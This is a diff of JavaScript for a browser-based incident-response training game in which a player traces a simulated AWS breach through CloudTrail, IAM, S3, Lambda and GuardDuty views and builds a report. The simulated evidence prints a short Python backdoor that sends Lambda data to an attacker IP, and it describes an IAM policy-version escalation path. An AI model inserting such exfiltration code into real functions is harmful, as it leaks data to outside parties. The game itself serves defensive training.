-            printLine('  Policy: DataAccessPolicy \u2192 added s3:*, lambda:*  \u2190 [ESCALATION]', 'error');
-            printLine('[03/03 01:18] s3:GetObject \u2014 hexworth-prod-data/customers/export.csv.gz', 'node-info');
-            printLine('  Size: 847MB  \u2190 [EXFILTRATION]', 'error');
-            printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
-            printLine('  Source IP: 91.234.xx.xx  \u2190 [PERSISTENCE]', 'error');
-            printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
-            printLine('  Effect: Allow s3:GetObject from *  \u2190 [BUCKET OPENED]', 'error');
-            break;
-
-        case 'iam-console':
-            printLine('=== IAM INVESTIGATION ===', 'heading');
-            printLine('User: svc-deploy (service account)', 'node-info');
-            printLine('Access Key: AKIAEXAMPLE123', 'node-info');
-            printLine('Created: 2025-06-15', 'info');
-            printLine('Last rotated: NEVER  \u2190 [VIOLATION]', 'error');
-            printLine('', 'system');
-            printLine('Policy versions:', 'heading');
-            printLine('  v1 (2025-06-15): s3:PutObject on hexworth-deploy/*', 'info');
-            printLine('  v2 (2026-03-03): s3:*, lambda:*, iam:*  \u2190 [ESCALATED]', 'error');
-            printLine('', 'system');
-            printLine('[!] Policy v2 grants full S3, Lambda, and IAM access', 'error');
-            printLine('Escalation path: CreatePolicyVersion \u2192 SetDefaultPolicyVersion', 'warning');
-            STATE.iamEscalationTraced = true;
-            break;
-
-        case 's3-bucket':
-            printLine('=== S3 BUCKET: hexworth-prod-data ===', 'heading');
-            printLine('Objects: 12,847 | Size: 45.2GB', 'node-info');
-            printLine('Access logging: ENABLED', 'info');
-            printLine('', 'system');
-            printLine('Recent access events:', 'heading');
-            printLine('[03/03 01:18] GetObject: customers/export.csv.gz (847MB)', 'warning');
-            printLine('  Requester: AKIAEXAMPLE123 from 91.234.xx.xx', 'warning');
-            printLine('[03/03 01:22] PutBucketPolicy: public read enabled  \u2190 [CRITICAL]', 'error');
-            printLine('', 'system');
-            printLine('Exfiltrated data:', 'heading');
-            printLine('  customers/export.csv.gz \u2014 847MB', 'error');
-            printLine('  Content: 2.3M customer records (PII: names, emails, SSN)', 'error');
-            STATE.exfilDataDetermined = true;
-            break;
-
-        case 'lambda-func':
-            printLine('=== LAMBDA: data-processor ===', 'heading');
-            printLine('Runtime: Python 3.12', 'node-info');
-            printLine('Last modified: 03/03 01:20 (by AKIAEXAMPLE123)', 'warning');
-            printLine('', 'system');
-            printLine('Code diff (original \u2192 modified):', 'heading');
-            printLine('+ import urllib.request', 'error');
-            printLine('+ def exfil(data):', 'error');
-            printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
-            printLine("+         data=json.dumps(data).encode())", 'error');
-            printLine('', 'system');
-            printLine('[!] BACKDOOR: Lambda modified to exfiltrate processed data', 'error');
-            printLine("Trigger: S3 PutObject events on hexworth-prod-data/", 'warning');
-            break;
-
-        case 'vpc-flowlogs':
-            printLine('=== VPC FLOW LOGS ===', 'heading');
-            printLine('[03/03 01:14] 91.234.xx.xx \u2192 10.0.1.50:443 ACCEPT (API Gateway)', 'node-info');
-            printLine('[03/03 01:18] 10.0.1.50 \u2192 s3.amazonaws.com:443 ACCEPT (847MB)', 'warning');
-            printLine('[03/03 01:20] 91.234.xx.xx \u2192 lambda.us-east-1:443 ACCEPT', 'warning');
-            printLine('[03/03 01:25] 10.0.2.100 \u2192 91.234.xx.xx:443 ACCEPT (outbound)  \u2190 [EXFIL]', 'error');
-            printLine('', 'system');
-            printLine('Total outbound to 91.234.xx.xx: 847MB over 11 minutes', 'error');
-            break;
-
-        case 'guardduty':
-            printLine('=== GUARDDUTY FINDINGS ===', 'heading');
-            printLine('[HIGH] UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration', 'error');
-            printLine('  Resource: AKIAEXAMPLE123   Severity: 8.5/10', 'warning');
-            printLine('[HIGH] Exfiltration:S3/MaliciousIPCaller', 'error');
-            printLine('  Resource: hexworth-prod-data   Severity: 9.0/10', 'warning');
-            printLine('[MEDIUM] Persistence:IAMUser/AnomalousBehavior', 'warning');
-            printLine('  Resource: svc-deploy   Severity: 6.5/10', 'info');
-            printLine('[HIGH] Impact:S3/PermissionsModification', 'error');
-            printLine('  Resource: hexworth-prod-data bucket policy   Severity: 8.0/10', 'warning');
-            break;
-
-        case 'secrets-manager':
-            printLine('=== SECRETS MANAGER ===', 'heading');
-            printLine('Secret: svc-deploy-api-key', 'node-info');
-            printLine('Status: ACTIVE  \u2190 [SHOULD BE ROTATED]', 'error');
-            printLine('Last accessed: 03/03 01:14', 'warning');
-            printLine('Version stages: AWSCURRENT (created 2025-06-15)', 'info');
-            printLine('', 'system');
-            printLine('[!] This key has been compromised.', 'error');
-            printLine('Source of breach: Key found in public GitHub repository', 'error');
-            printLine('  Repository: hexworth-corp/deploy-scripts (DELETED, cached by GitGuardian)', 'warning');
-            printLine('  File: .env.production (committed 02/28)', 'warning');
-            printLine('  Discovered: 03/03 by threat intel feed', 'info');
-            STATE.compromisedKeyFound = true;
-            break;
-
-        case 'config-audit':
-            printLine('=== AWS CONFIG TIMELINE ===', 'heading');
-            printLine('Resource: hexworth-prod-data (S3 Bucket)', 'node-info');
-            printLine('[02/28] Config: PublicAccessBlock=ON, BucketPolicy=restrictive \u2713', 'success');
-            printLine('[03/03 01:22] Config CHANGE: BucketPolicy=public-read  \u2190 [NON-COMPLIANT]', 'error');
-            printLine('[03/03 01:22] Config CHANGE: PublicAccessBlock=OFF  \u2190 [NON-COMPLIANT]', 'error');
-            printLine('', 'system');
-            printLine('Resource: DataAccessPolicy (IAM)', 'node-info');
-            printLine('[02/28] Config: s3:PutObject on hexworth-deploy/* only \u2713', 'success');
-            printLine('[03/03 01:15] Config CHANGE: s3:*, lambda:*, iam:*  \u2190 [NON-COMPLIANT]', 'error');
-            printLine('', 'system');
-            printLine('2 resources NON-COMPLIANT', 'warning');
-            break;
-
-        default:
-            printLine('No detailed information available for this service.', 'system');
-    }
-
-    printLine('', 'system');
-    printLine('Sources examined: ' + STATE.sourcesExamined.size + ' / 8', 'info');
-    if (STATE.sourcesExamined.size < 5) {
-        printLine('Examine ' + (5 - STATE.sourcesExamined.size) + ' more source(s) before building the report.', 'system');
-    } else {
-        printLine('Sufficient sources gathered. Use "report" to build the incident report.', 'info');
-    }
-
-    checkObjectives();
-    saveState();
-}
-
-function cmdQuery(args) {
-    if (!args.length) {
-        printLine('Usage: query <filter>', 'error');
-        printLine('Examples: query AKIAEXAMPLE123, query 91.234, query s3', 'system');
-        return;
-    }
-
-    // Must be at cloudtrail or have examined it
-    if (currentCellType() !== 'cloudtrail' && !STATE.sourcesExamined.has('cloudtrail')) {
-        printLine('query: requires access to CLOUDTRAIL.', 'error');
-        printLine('Navigate to CLOUDTRAIL and examine it first.', 'system');
-        return;
-    }
-
-    var filter = args.join(' ').toLowerCase();
-    printLine('', 'system');
-
-    if (filter.indexOf('akia') !== -1 || filter.indexOf('key') !== -1 || filter === 'akiaexample123') {
-        printLine('=== CLOUDTRAIL QUERY: AKIAEXAMPLE123 ===', 'heading');
-        printLine('[03/03 01:14] sts:GetCallerIdentity', 'node-info');
-        printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy', 'node-info');
-        printLine('[03/03 01:15] iam:SetDefaultPolicyVersion', 'node-info');
-        printLine('[03/03 01:17] iam:AttachUserPolicy', 'node-info');
-        printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz', 'node-info');
-        printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
-        printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'node-info');
-        printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 hexworth-prod-data', 'node-info');
-        printLine('[03/03 01:22] s3:PutPublicAccessBlock', 'node-info');
-        printLine('', 'system');
-        printLine('Total: 9 API calls by AKIAEXAMPLE123 in 8-minute window.', 'info');
-    } else if (filter.indexOf('91.234') !== -1 || filter.indexOf('tor') !== -1) {
-        printLine('=== CLOUDTRAIL QUERY: 91.234.xx.xx ===', 'heading');
-        printLine('[03/03 01:14] sts:GetCallerIdentity \u2014 source: 91.234.xx.xx', 'node-info');
-        printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
-        printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 source: 91.234.xx.xx', 'node-info');
-        printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 source: 91.234.xx.xx', 'node-info');
-        printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 source: 91.234.xx.xx', 'node-info');
-        printLine('', 'system');
-        printLine('IP 91.234.xx.xx: known Tor exit node. All activity via this IP is attacker-controlled.', 'warning');
-    } else if (filter.indexOf('s3') !== -1) {
-        printLine('=== CLOUDTRAIL QUERY: S3 OPERATIONS ===', 'heading');
-        printLine('[03/03 01:18] s3:ListBucket \u2014 hexworth-prod-data', 'node-info');
-        printLine('[03/03 01:18] s3:GetObject \u2014 customers/export.csv.gz (847MB)', 'error');
-        printLine('[03/03 01:22] s3:PutBucketPolicy \u2014 public-read enabled', 'error');
-        printLine('[03/03 01:22] s3:PutPublicAccessBlock \u2014 block disabled', 'error');
-    } else if (filter.indexOf('iam') !== -1 || filter.indexOf('policy') !== -1) {
-        printLine('=== CLOUDTRAIL QUERY: IAM OPERATIONS ===', 'heading');
-        printLine('[03/03 01:15] iam:CreatePolicyVersion \u2014 DataAccessPolicy v2', 'error');
-        printLine('[03/03 01:15] iam:SetDefaultPolicyVersion \u2014 set to v2', 'error');
-        printLine('[03/03 01:17] iam:AttachUserPolicy \u2014 added admin-policy to svc-deploy', 'error');
-    } else if (filter.indexOf('lambda') !== -1) {
-        printLine('=== CLOUDTRAIL QUERY: LAMBDA OPERATIONS ===', 'heading');
-        printLine('[03/03 01:20] lambda:UpdateFunctionCode \u2014 data-processor', 'error');
-        printLine('[03/03 01:20] lambda:UpdateFunctionConfiguration', 'warning');
-        printLine('Source: 91.234.xx.xx (Tor exit node)', 'error');
-    } else {
-        printLine('No matching events for filter: "' + args.join(' ') + '".', 'system');
-        printLine('Try: query AKIAEXAMPLE123, query 91.234, query s3, query iam, query lambda', 'info');
-    }
-
-    printLine('', 'system');
-}
-
-function cmdDiff(args) {
-    if (!args.length) {
-        printLine('Usage: diff <resource>', 'error');
-        printLine('Resources: policy, code, s3, iam', 'system');
-        return;
-    }
-
-    var resource = args.join(' ').toLowerCase();
-    printLine('', 'system');
-
-    if (resource.indexOf('policy') !== -1 || resource.indexOf('iam') !== -1) {
-        if (currentCellType() !== 'iam-console' && !STATE.sourcesExamined.has('iam-console')) {
-            printLine('diff: examine IAM-CONSOLE first.', 'error');
-            return;
-        }
-        printLine('=== IAM POLICY DIFF: DataAccessPolicy ===', 'heading');
-        printLine('v1 (2025-06-15):', 'node-info');
-        printLine('  Effect: Allow', 'info');
-        printLine('  Action: ["s3:PutObject"]', 'info');
-        printLine('  Resource: "arn:aws:s3:::hexworth-deploy/*"', 'info');
-        printLine('', 'system');
-        printLine('v2 (2026-03-03 01:15) [CURRENT]:', 'node-info');
-        printLine('  Effect: Allow', 'info');
-        printLine('+ Action: ["s3:*", "lambda:*", "iam:*"]  \u2190 ADDED', 'error');
-        printLine('+ Resource: "*"  \u2190 WIDENED TO ALL RESOURCES', 'error');
-        printLine('', 'system');
-        printLine('Change summary: 7 additional permission categories granted.', 'warning');
-        STATE.sourcesExamined.add('iam-console');
-        STATE.iamEscalationTraced = true;
-    } else if (resource.indexOf('code') !== -1 || resource.indexOf('lambda') !== -1) {
-        if (currentCellType() !== 'lambda-func' && !STATE.sourcesExamined.has('lambda-func')) {
-            printLine('diff: examine LAMBDA first.', 'error');
-            return;
-        }
-        printLine('=== LAMBDA CODE DIFF: data-processor ===', 'heading');
-        printLine('Modified: 03/03 01:20 by AKIAEXAMPLE123', 'warning');
-        printLine('', 'system');
-        printLine('  import boto3', 'info');
-        printLine('  import json', 'info');
-        printLine('+ import urllib.request', 'error');
-        printLine('', 'system');
-        printLine('  def handler(event, context):', 'info');
-        printLine('      data = process(event)', 'info');
-        printLine('+     exfil(data)', 'error');
-        printLine('      return data', 'info');
-        printLine('', 'system');
-        printLine('+ def exfil(data):', 'error');
-        printLine("+     urllib.request.urlopen('https://91.234.xx.xx/collect',", 'error');
-        printLine("+         data=json.dumps(data).encode())", 'error');
-        printLine('', 'system');
-        printLine('3 lines added. Backdoor function introduced.', 'warning');
-        STATE.sourcesExamined.add('lambda-func');
-    } else if (resource.indexOf('s3') !== -1 || resource.indexOf('bucket') !== -1) {
-        if (currentCellType() !== 'config-audit' && !STATE.sourcesExamined.has('config-audit')) {
-            printLine('diff: examine CONFIG-AUDIT first.', 'error');
-            return;
-        }
-        printLine('=== S3 BUCKET POLICY DIFF: hexworth-prod-data ===', 'heading');
-        printLine('Before (02/28):', 'node-info');
-        printLine('  PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'success');
-        printLine('  BucketPolicy: { Effect: Deny, Principal: *, NotAction: [...internal] }', 'success');
-        printLine('', 'system');
-        printLine('After (03/03 01:22):', 'node-info');
-        printLine('- PublicAccessBlock: { BlockPublicAcls: true, BlockPublicPolicy: true }', 'error');
-        printLine('+ PublicAccessBlock: { BlockPublicAcls: false, BlockPublicPolicy: false }', 'error');
-        printLine('- BucketPolicy: { Effect: Deny, ... }', 'error');
-        printLine('+ BucketPolicy: { Effect: Allow, Principal: "*", Action: "s3:GetObject" }', 'error');
-        printLine('', 'system');
-        printLine('Bucket changed from private to fully public in 1 minute.', 'warning');
-        STATE.sourcesExamined.add('config-audit');
-    } else {
-        printLine('diff: unknown resource "' + args.join(' ') + '".', 'error');
-        printLine('Try: diff policy, diff code, diff s3', 'system');
-    }
-
-    printLine('', 'system');
-    checkObjectives();
-    saveState();
-}
-
-function cmdDownload() {
-    if (currentCellType() !== 's3-bucket') {
-        printLine('download: must be at S3-BUCKET node.', 'error');
-        return;
-    }
-
-    printLine('', 'system');
-    printLine('Downloading access logs from hexworth-prod-data...', 'system');
-    printLine('', 'system');
-    printLine('=== S3 ACCESS LOG: hexworth-prod-data ===', 'heading');
-    printLine('2026-03-03T01:18:01Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
-    printLine('  Requester IP: 91.234.xx.xx  Bytes: 888,279,040  Status: 200', 'warning');
-    printLine('2026-03-03T01:18:47Z AKIAEXAMPLE123 REST.GET.OBJECT customers/export.csv.gz', 'node-info');
-    printLine('  Requester IP: 91.234.xx.xx  Bytes: 0  Status: 206 (partial)', 'warning');
-    printLine('2026-03-03T01:22:10Z AKIAEXAMPLE123 REST.PUT.BUCKETPOLICY', 'node-info');
-    printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
-    printLine('2026-03-03T01:22:11Z AKIAEXAMPLE123 REST.PUT.PUBLIC_ACCESS_BLOCK', 'node-info');
-    printLine('  Requester IP: 91.234.xx.xx  Status: 204', 'error');
-    printLine('2026-03-03T01:23:44Z anonymous REST.GET.OBJECT customers/export.csv.gz', 'node-info');
-    printLine('  Requester IP: 45.11.yy.yy  Bytes: 888,279,040  Status: 200  \u2190 [PUBLIC ACCESS!]', 'error');
-    printLine('', 'system');
-    printLine('Public access confirmed: data downloaded by a second IP after bucket policy change.', 'error');
-
-    STATE.sourcesExamined.add('s3-bucket');
-    STATE.exfilDataDetermined = true;
-
-    printLine('', 'system');
-    checkObjectives();
-    saveState();
-}
-
-function cmdAnalyze(args) {
-    if (!args.length) {
-        printLine('Usage: analyze <resource>', 'error');
-        printLine('Resources: lambda, guardduty, vpc, cloudtrail', 'system');
-        return;
-    }
-
-    var resource = args.join(' ').toLowerCase();
-    printLine('', 'system');
-
-    if (resource.indexOf('lambda') !== -1 || resource.indexOf('code') !== -1) {
-        if (!STATE.sourcesExamined.has('lambda-func')) {
-            printLine('analyze: examine LAMBDA first.', 'error');
-            return;
-        }
-        printLine('=== LAMBDA ANALYSIS: data-processor ===', 'heading');
-        printLine('Full backdoor code reconstructed:', 'node-info');
-        printLine('', 'system');
-        printLine("import urllib.request, json", 'error');
-        printLine("", 'system');
-        printLine("def exfil(data):", 'error');
-        printLine("    req = urllib.request.Request(", 'error');
-        printLine("        'https://91.234.xx.xx/collect',", 'error');
-        printLine("        data=json.dumps(data).encode(),", 'error');
-        printLine("        method='POST'", 'error');
-        printLine("    )", 'error');
-        printLine("    urllib.request.urlopen(req, timeout=10)", 'error');
-        printLine('', 'system');
-        printLine('Backdoor fires on every Lambda invocation. Trigger: S3:PutObject.', 'warning');
-        printLine('Every file written to hexworth-prod-data is silently forwarded to attacker.', 'error');
-        printLine('MITRE ATT&CK: T1567.002 \u2014 Exfiltration to Cloud Storage', 'info');
-    } else if (resource.indexOf('guardduty') !== -1 || resource.indexOf('gdd') !== -1) {
-        if (!STATE.sourcesExamined.has('guardduty')) {
-            printLine('analyze: examine GUARDDUTY first.', 'error');
-            return;
-        }
-        printLine('=== GUARDDUTY FINDING DETAIL ===', 'heading');
-        printLine('Finding: Exfiltration:S3/MaliciousIPCaller (Severity 9.0)', 'error');
-        printLine('MITRE ATT&CK: T1530 \u2014 Data from Cloud Storage', 'info');
-        printLine('  Attacker used AKIAEXAMPLE123 to access hexworth-prod-data', 'warning');
-        printLine('  Source IP 91.234.xx.xx is in GuardDuty threat intel feed (Tor)', 'warning');
-        printLine('', 'system');
-        printLine('Finding: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration (8.5)', 'error');
-        printLine('MITRE ATT&CK: T1078.004 \u2014 Valid Accounts: Cloud Accounts', 'info');
-        printLine('  Credential AKIAEXAMPLE123 used from anomalous Tor IP', 'warning');
-        printLine('', 'system');
-        printLine('Full attack chain: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
-    } else if (resource.indexOf('vpc') !== -1 || resource.indexOf('flow') !== -1) {
-        if (!STATE.sourcesExamined.has('vpc-flowlogs')) {
-            printLine('analyze: examine VPC-FLOWLOGS first.', 'error');
-            return;
-        }
-        printLine('=== VPC TRAFFIC VOLUME ANALYSIS ===', 'heading');
-        printLine('Inbound from 91.234.xx.xx:', 'node-info');
-        printLine('  01:14-01:22  12 API connections  ~8KB total  (control traffic)', 'info');
-        printLine('Outbound to 91.234.xx.xx:', 'node-info');
-        printLine('  01:18  888MB  (S3 exfiltration \u2014 HTTPS GET)', 'error');
-        printLine('  01:25  ~2MB   (Lambda exfil callback \u2014 HTTPS POST)', 'error');
-        printLine('', 'system');
-        printLine('Total exfiltrated: ~890MB over 11-minute window.', 'error');
-        printLine('90MB/min sustained outbound \u2014 well above normal baseline of <1MB/min.', 'warning');
-    } else if (resource.indexOf('cloudtrail') !== -1 || resource.indexOf('trail') !== -1) {
-        if (!STATE.sourcesExamined.has('cloudtrail')) {
-            printLine('analyze: examine CLOUDTRAIL first.', 'error');
-            return;
-        }
-        printLine('=== CLOUDTRAIL DEEP ANALYSIS ===', 'heading');
-        printLine('Total events in incident window (01:14-01:25):', 'node-info');
-        printLine('  IAM operations: 3 (all privilege escalation)', 'error');
-        printLine('  S3 operations:  4 (exfil + bucket policy tampering)', 'error');
-        printLine('  Lambda ops:     2 (code update + config change)', 'error');
-        printLine('  STS ops:        1 (identity verification)', 'info');
-        printLine('', 'system');
-        printLine('CloudTrail was NOT disabled. Attacker left a complete evidence trail.', 'success');
-        printLine('CloudTrail integrity validation: PASSED (log file hashes verified)', 'success');
-    } else {
-        printLine('analyze: unknown resource "' + args.join(' ') + '".', 'error');
-        printLine('Try: analyze lambda, analyze guardduty, analyze vpc, analyze cloudtrail', 'system');
-    }
-
-    printLine('', 'system');
-}
-
-function cmdReport() {
-    // Require at least 5 sources examined plus the three specific findings
-    var missing = [];
-    if (STATE.sourcesExamined.size < 5) {
-        missing.push('examine at least ' + (5 - STATE.sourcesExamined.size) + ' more source(s)');
-    }
-    if (!STATE.compromisedKeyFound) {
-        missing.push('find the compromised key (examine SECRETS-MGR)');
-    }
-    if (!STATE.iamEscalationTraced) {
-        missing.push('trace IAM escalation (examine IAM-CONSOLE)');
-    }
-    if (!STATE.exfilDataDetermined) {
-        missing.push('determine exfil data (examine S3-BUCKET)');
-    }
-
-    if (missing.length > 0) {
-        printLine('Cannot build report yet. Still needed:', 'warning');
-        missing.forEach(function(m) {
-            printLine('  \u2014 ' + m, 'error');
-        });
-        printLine('', 'system');
-        printLine('Sources examined: ' + STATE.sourcesExamined.size + '/8', 'info');
-        return;
-    }
-
-    printLine('', 'system');
-    printLine('=== INCIDENT REPORT: CLOUD-2026-0305 ===', 'heading');
-    printLine('', 'system');
-    printLine('SUMMARY: Cloud infrastructure breach via compromised API key', 'node-info');
-    printLine('', 'system');
-    printLine('TIMELINE:', 'heading');
-    printLine('[02/28] API key (AKIAEXAMPLE123) committed to public GitHub repo', 'warning');
-    printLine('[03/03 01:14] Attacker authenticates from Tor (91.234.xx.xx)', 'error');
-    printLine('[03/03 01:15] IAM privilege escalation \u2014 s3:*, lambda:*, iam:*', 'error');
-    printLine('[03/03 01:18] S3 exfiltration \u2014 847MB customer data (2.3M records)', 'error');
-    printLine('[03/03 01:20] Lambda backdoor installed for persistent access', 'error');
-    printLine('[03/03 01:22] S3 bucket policy changed to public read', 'error');
-    printLine('', 'system');
-    printLine('IMPACT:', 'heading');
-    printLine('  \u2014 2.3M customer records exposed (PII: names, emails, SSN)', 'error');
-    printLine('  \u2014 Lambda function compromised for ongoing exfiltration', 'error');
-    printLine('  \u2014 S3 bucket exposed to public internet', 'error');
-    printLine('', 'system');
-    printLine('ROOT CAUSE: Unrotated API key exposed in public repository', 'warning');
-    printLine('', 'system');
-    printLine('MITRE ATT\u0026CK: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
-    printLine('', 'system');
-    printLine('INCIDENT REPORT COMPLETE.', 'success');
-
-    STATE.reportBuilt = true;
-
-    printLine('', 'system');
-    checkObjectives();
-    updateGrid();
-    saveState();
-}
-
-function cmdStatus() {
-    var col = STATE.position.col;
-    var row = STATE.position.row;
-    var cellType = GRID_MAP[row][col];
-    var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? CELL_INFO[cellType].label : 'No service';
-
-    printLine('', 'system');
-    printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
-    printLine('Position: (' + col + ',' + row + ') \u2014 ' + posLabel, 'info');
-    printLine('Services discovered: ' + STATE.nodesDiscovered.size + ' / 8', 'info');
-    printLine('Sources examined: ' + STATE.sourcesExamined.size + ' / 8', 'info');
-    printLine('Commands used: ' + STATE.commandCount, 'info');
-    printLine('', 'system');
-    printLine('Compromised key found:   ' + (STATE.compromisedKeyFound ? 'YES \u2014 AKIAEXAMPLE123' : 'NO'), STATE.compromisedKeyFound ? 'success' : 'warning');
-    printLine('IAM escalation traced:   ' + (STATE.iamEscalationTraced ? 'YES' : 'NO'), STATE.iamEscalationTraced ? 'success' : 'warning');
-    printLine('Exfil data determined:   ' + (STATE.exfilDataDetermined ? 'YES \u2014 2.3M records, 847MB' : 'NO'), STATE.exfilDataDetermined ? 'success' : 'warning');
-    printLine('Incident report built:   ' + (STATE.reportBuilt ? 'YES' : 'NO'), STATE.reportBuilt ? 'success' : 'warning');
-    printLine('', 'system');
-    printLine('Sources examined:', 'heading');
-
-    var allSources = ['cloudtrail', 'iam-console', 's3-bucket', 'lambda-func', 'vpc-flowlogs', 'guardduty', 'secrets-manager', 'config-audit'];
-    allSources.forEach(function(src) {
-        var done = STATE.sourcesExamined.has(src);
-        var info = CELL_INFO[src];
-        printLine((done ? ' [X] ' : ' [ ] ') + info.label, done ? 'success' : 'system');
-    });
-
-    printLine('', 'system');
-    printLine('Objectives:', 'heading');
-
-    var objText = [
-        'Find compromised key (examine SECRETS-MGR)',
-        'Trace IAM escalation (examine IAM-CONSOLE)',
-        'Determine exfil data (examine S3-BUCKET)',
-        'Build incident report ("report" with 5+ sources)'
-    ];
-
-    STATE.objectives.forEach(function(done, i) {
-        printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
-    });
-}
-
-// ═══ Utility ═══
-
-function padRight(str, len) {
-    while (str.length < len) str += ' ';
-    return str;
-}
-
-// ═══ Objectives ═══
-
-function checkObjectives() {
-    var prev = STATE.objectives.slice();
-
-    STATE.objectives[0] = STATE.compromisedKeyFound;
-    STATE.objectives[1] = STATE.iamEscalationTraced;
-    STATE.objectives[2] = STATE.exfilDataDetermined;
-    STATE.objectives[3] = STATE.reportBuilt;
-
-    // Announce newly completed objectives
-    STATE.objectives.forEach(function(done, i) {
-        if (done && !prev[i]) {
-            printLine('', 'system');
-            printLine('[OBJECTIVE COMPLETE] ' + OBJ_LABELS[i], 'success');
-        }
-    });
-
-    updateObjectivesUI();
-
-    // All complete?
-    if (STATE.objectives.every(Boolean) && !STATE.completed) {
-        STATE.completed = true;
-        var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
-
-        // Write completion record; remove in-progress save
-        var stats = {
-            completed: true,
-            time: elapsed,
-            commands: STATE.commandCount,
-            nodesDiscovered: STATE.sourcesExamined.size,  // use sources for this mission
-            timestamp: Date.now()
-        };
-        try {
-            localStorage.setItem('hexworth_operator_forensics02', JSON.stringify(stats));
-            localStorage.removeItem('hexworth_operator_forensics02_save');
-        } catch (e) {}
-
-        printLine('', 'system');
-        printLine('\u2550\u2550\u2550 ALL OBJECTIVES COMPLETE \u2550\u2550\u2550', 'heading');
-        printLine('Mission FORENSICS-02 accomplished.', 'success');
-
-        document.getElementById('header-status').textContent = 'COMPLETE';
-        document.getElementById('header-status').style.color = '#39ff14';
-
-        setTimeout(function() { showMissionComplete(elapsed); }, 1500);
-    }
-}
-
-function updateObjectivesUI() {
-    STATE.objectives.forEach(function(done, i) {
-        var el = document.getElementById('obj-' + i);
-        if (!el) return;
-        var check = el.querySelector('.obj-check');
-        if (done) {
-            el.classList.add('complete');
-            check.textContent = '\u2713';
-        } else {
-            el.classList.remove('complete');
-            check.textContent = '';
-        }
-    });
-}
-
-function showMissionComplete(elapsed) {
-    var mins = Math.floor(elapsed / 60);
-    var secs = elapsed % 60;
-    var timeStr = mins > 0 ? mins + 'm ' + secs + 's' : secs + 's';
-
-    // Show sources examined as the "nodes" stat for this forensics mission
-    document.getElementById('stat-nodes').textContent = STATE.sourcesExamined.size;
-    document.getElementById('stat-commands').textContent = STATE.commandCount;
-    document.getElementById('stat-time').textContent = timeStr;
-
-    document.getElementById('mission-complete').classList.add('visible');
-}
-
-// ═══ Save / Load ═══
-
-function saveState() {
-    try {
-        var data = {
-            position: STATE.position,
-            visibility: STATE.visibility,
-            objectives: STATE.objectives,
-            nodesDiscovered: Array.from(STATE.nodesDiscovered),
-            commandCount: STATE.commandCount,
-            startTime: STATE.startTime,
-            compromisedKeyFound: STATE.compromisedKeyFound,
-            iamEscalationTraced: STATE.iamEscalationTraced,
-            exfilDataDetermined: STATE.exfilDataDetermined,
-            reportBuilt: STATE.reportBuilt,
-            // Sets must be serialized as arrays for JSON
-            sourcesExamined: Array.from(STATE.sourcesExamined)
-        };
-        localStorage.setItem('hexworth_operator_forensics02_save', JSON.stringify(data));
-    } catch (e) {}
-}
-
-function loadState() {
-    try {
-        var saved = localStorage.getItem('hexworth_operator_forensics02_save');
-        if (!saved) return false;
-        var data = JSON.parse(saved);
-        STATE.position = data.position;
-        STATE.visibility = data.visibility;
-        STATE.objectives = data.objectives;
-        STATE.nodesDiscovered = new Set(data.nodesDiscovered);
-        STATE.commandCount = data.commandCount;
-        STATE.startTime = data.startTime;
-        STATE.compromisedKeyFound = data.compromisedKeyFound || false;
-        STATE.iamEscalationTraced = data.iamEscalationTraced || false;
-        STATE.exfilDataDetermined = data.exfilDataDetermined || false;
-        STATE.reportBuilt = data.reportBuilt || false;
-        STATE.sourcesExamined = new Set(data.sourcesExamined || []);
-        return true;
-    } catch (e) {
-        return false;
-    }
-}
-
-function resetState() {
-    STATE = {
-        position: { col: 0, row: 0 },
-        visibility: {},
-        objectives: [false, false, false, false],
-        nodesDiscovered: new Set(),
-        commandCount: 0,
-        commandHistory: [],
-        historyIndex: -1,
-        startTime: Date.now(),
-        completed: false,
-        compromisedKeyFound: false,
-        iamEscalationTraced: false,
-        exfilDataDetermined: false,
-        reportBuilt: false,
-        sourcesExamined: new Set()
-    };
-    // Starting cell is cloudtrail at (0,0)
-    STATE.visibility['0,0'] = 'visited';
-    STATE.nodesDiscovered.add('cloudtrail');
-    revealAdjacent(0, 0);
-}
-
-// ═══ Command Parser ═══
-
-function executeCommand(input) {
-    STATE.commandCount++;
-
-    // Echo command to terminal
-    printLine('investigator@aws:~$ ' + input, 'prompt-echo');
-
-    var parts = input.trim().split(/\s+/);
-    var cmd = parts[0].toLowerCase();
-    var args = parts.slice(1);
-
-    switch (cmd) {
-        case 'scan':     cmdScan(); break;
-        case 'move':     cmdMove(args); break;
-        case 'examine':  cmdExamine(); break;
-        case 'query':    cmdQuery(args); break;
-        case 'diff':     cmdDiff(args); break;
-        case 'download': cmdDownload(); break;
-        case 'analyze':  cmdAnalyze(args); break;
-        case 'report':   cmdReport(); break;
-        case 'status':   cmdStatus(); break;
-        case 'help':     cmdHelp(); break;
-        case 'clear':
-            document.getElementById('term-output').innerHTML = '';
-            break;
-        default:
-            printLine('Unknown command: ' + cmd, 'error');
-            printLine('Type "help" for available commands.', 'system');
-    }
-}
-
-// ═══ Terminal Input ═══
-
-function setupInput() {
-    var input = document.getElementById('term-input');
-
-    input.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            var cmd = this.value.trim();
